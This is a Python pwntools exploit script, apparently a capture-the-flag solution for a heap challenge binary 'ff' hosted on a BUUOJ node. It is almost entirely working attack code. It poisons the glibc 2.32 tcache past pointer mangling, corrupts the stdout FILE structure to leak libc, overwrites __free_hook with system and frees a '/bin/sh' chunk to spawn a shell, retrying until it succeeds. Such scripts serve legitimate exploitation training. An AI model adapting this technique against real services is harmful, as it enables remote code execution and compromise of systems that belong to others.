# -*- encoding: utf-8 -*-
import sys 
import os 
from pwn import * 
context.log_level = 'debug' 
context.update( os = 'linux', arch = 'amd64',timeout = 1)
binary = './ff'
elf = ELF(binary)
libc = elf.libc
#libc = ELF('')
context.binary = binary
DEBUG = 1
if DEBUG:
    p = process(binary)
    libc = elf.libc
    #p = process(['qemu-arm', binary])
    #p = process(['qemu-aarch64','-L','',binary])
    #p = process(['qemu-aarch64','-L','',-g,'1234',binary])
else:
    host = 'node4.buuoj.cn'
    port = '26589'
    p = remote(host,port)
l64 = lambda            : u64(p.recvuntil('\x7f')[-6:].ljust(8,'\x00'))
l32 = lambda            : u32(p.recvuntil('\xf7')[-4:].ljust(4,'\x00'))
sla = lambda a,b        : p.sendlineafter(str(a),str(b))
sa  = lambda a,b        : p.sendafter(str(a),str(b))
lg  = lambda name,data  : p.success(name + ': 0x%x' % data)
se  = lambda payload    : p.send(payload)
rl  = lambda            : p.recv()
sl  = lambda payload    : p.sendline(payload)
ru  = lambda a          : p.recvuntil(str(a))
rint= lambda            : int( p.recv(14)[2:] , 16)

def dbg( b = null):
    if (b == null):
        gdb.attach(p)
        pause()
    else:
        gdb.attach(p,'b %s'%b)

def one_gadget(filename):
    log.progress('Leak One_Gadgets...')
    one_ggs = str(subprocess.check_output(['one_gadget','--raw', '-f',filename])).split(' ')
    return list(map(int,one_ggs))

def cmd(num):
    sla('>>',num)

def add(size,text):
    cmd(1)
    sla("Size:",size)
    sa("Content:",text)

def delete():
    cmd(2)

def show():
    cmd(3)

def edit(text):
    cmd(5)
    sa("Content:",text)

one_gad = one_gadget(libc.path)

#2.32 tcache fd指针与tcache管理块做过异或处理
def to_pwn():
    add(0x78,"a")
    add(0x38,"a")
    delete()

    add(0x18,"a")
    delete()

    add(0x68,"a")
    add(0x68,"a")
    delete()

    add(0x58,"a")
    delete()

    add(0x78,"a")
    delete()
    show()
 
    heap_addr = u64(p.recv(8)) 
    heap_base = heap_addr << 12
    lg("heap_addr",heap_addr)

    edit("x"*0x10)
    delete()

    edit(p64((heap_base + 0x90) ^ heap_addr )+p64(heap_addr+0x10))

    add(0x78,"A")


    payload = p64(heap_base + 0xa0) + p64(0x200 + 0x80 + 0x40  + 0x70 + 0x20 + 0x70  + 0x60+ 1) +  p64(heap_base + 0xa0) *8
    add(0x78, payload )

    add(0x10,"h")
    delete()

    payload =  p16(0x96c0)

    add(0x70,payload)

    payload = p64(0xfbad1800)+p64(0)*3+"\x00"
    add(0x38,payload)
    leak_addr = l64()
    if leak_addr == 0:
        exit(1)
    lg("leak_addr",leak_addr)

    _IO_2_1_stdout_ = leak_addr - 132
    libc.address = _IO_2_1_stdout_ - libc.sym["_IO_2_1_stdout_"]
    free_hook = libc.sym["__free_hook"]
    system = libc.sym["system"]

    payload = p64(0)*2 + p64(free_hook) *4
    add(0x58,payload)
    add(0x68,p64(system))

    add(0x10,"/bin/sh\x00")
    delete()

    p.interactive()


while 1 :
    try:
        to_pwn()
    except:
        p.close()
        p = process(binary)
        #p = remote(host,port)



'''
@File    :   ff.py
@Time    :   2021/08/09 09:08:14
@Author  :   Niyah 
'''
